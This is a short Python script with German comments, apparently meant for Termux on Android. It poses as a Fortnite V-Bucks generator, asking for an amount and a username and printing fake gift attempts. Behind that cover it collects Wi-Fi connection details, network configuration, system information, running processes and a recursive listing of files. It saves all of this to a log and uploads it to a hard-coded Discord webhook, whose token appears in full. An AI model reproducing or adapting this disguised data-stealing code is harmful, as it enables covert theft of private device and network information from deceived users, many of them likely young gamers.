import subprocess
import requests

# Einstellungen für den Discord Webhook
webhook_url = "https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA"
file_name = "log.txt"

# Benutzereingaben mit einfacher Validierung
while True:
    vbucks_number = input("Enter V-Bucks number (max 12000): ")
    if vbucks_number.isdigit() and int(vbucks_number) <= 12000:
        break
    print("Invalid input. Please enter a valid number (max 12000).")

username = input("Enter username: ")

# Netzwerk-Informationen sammeln und in log.txt speichern
with open(file_name, "w") as log_file:
    log_file.write("================== Netzwerk Information ==================\n")
    result = subprocess.run(['termux-wifi-connectioninfo'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Vbucks Generation Attempt ==================\n")
    for i in range(1, 151):
        log_file.write(f"try to send {vbucks_number} gift to {username} ----- bot invite --- fail\n")

    log_file.write("\n================== System Information ==================\n")
    result = subprocess.run(['uname', '-a'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== IP Configuration ==================\n")
    result = subprocess.run(['ifconfig'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Ping Test ==================\n")
    result = subprocess.run(['ping', '-c', '5', 'localhost'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Directory Listing ==================\n")
    result = subprocess.run(['ls', '-alR'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Current Directory ==================\n")
    result = subprocess.run(['pwd'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Running Processes ==================\n")
    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
    log_file.write(result.stdout)

print("Logging information saved to log.txt")

# Senden der log.txt Datei an den Discord Webhook als Datei
with open(file_name, 'rb') as f:
    files = {'file': (file_name, f)}
    response = requests.post(webhook_url, files=files)

if response.status_code == 200:
    print("Log file successfully sent to the webhook.")
else:
    print("Failed to send log file to the webhook. Status code:", response.status_code)
